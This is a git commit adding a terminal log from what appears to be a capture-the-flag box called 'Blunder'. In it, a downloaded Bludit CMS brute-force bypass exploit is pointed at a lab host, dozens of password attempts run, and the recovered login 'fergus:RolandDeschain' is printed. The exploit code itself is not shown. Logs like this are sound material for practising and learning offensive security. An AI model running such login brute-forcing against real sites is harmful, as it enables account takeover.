547385c113fbdd8e797e24a60209cf8e86d7c98b
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-06-23 11:22:13 -0400

    Create terminal2.bash

---
+++ Blunder/terminal2.bash
@@ -0,0 +1,77 @@
+// Searched online for a brute force bypass of BLUDIT and found one @
+// https://github.com/bludit/bludit/pull/1090
+.
+.
+.
+allenwest1@debian:~$ cd Desktop
+allenwest1@debian:~/Desktop$ nano exploit.py
+.
+.
+.
+// Changed the host to http://10.10.10.191
+// Changed the username to 'fergus'
+.
+.
+.
+allenwest1@debian:~/Desktop$ sudo python exploit.py[*] Trying: Password0
+[*] Trying: Password1
+[*] Trying: Password2
+[*] Trying: Password3
+[*] Trying: Password4
+[*] Trying: Password5
+[*] Trying: Password6
+[*] Trying: Password7
+[*] Trying: Password8
+[*] Trying: Password9
+[*] Trying: Password10
+[*] Trying: Password11
+[*] Trying: Password12
+[*] Trying: Password13
+[*] Trying: Password14
+[*] Trying: Password15
+[*] Trying: Password16
+[*] Trying: Password17
+[*] Trying: Password18
+[*] Trying: Password19
+[*] Trying: Password20
+[*] Trying: Password21
+[*] Trying: Password22
+[*] Trying: Password23
+[*] Trying: Password24
+[*] Trying: Password25
+[*] Trying: Password26
+[*] Trying: Password27
+[*] Trying: Password28
+[*] Trying: Password29
+[*] Trying: Password30
+[*] Trying: Password31
+[*] Trying: Password32
+[*] Trying: Password33
+[*] Trying: Password34
+[*] Trying: Password35
+[*] Trying: Password36
+[*] Trying: Password37
+[*] Trying: Password38
+[*] Trying: Password39
+[*] Trying: Password40
+[*] Trying: Password41
+[*] Trying: Password42
+[*] Trying: Password43
+[*] Trying: Password44
+[*] Trying: Password45
+[*] Trying: Password46
+[*] Trying: Password47
+[*] Trying: Password48
+[*] Trying: Password49
+() 
+SUCCESS: Password found!
+Use fergus:RolandDeschain to login
+()
+.
+.
+.
+// Bingo!
+// Back to terminal1.bash
+.
+.
+.
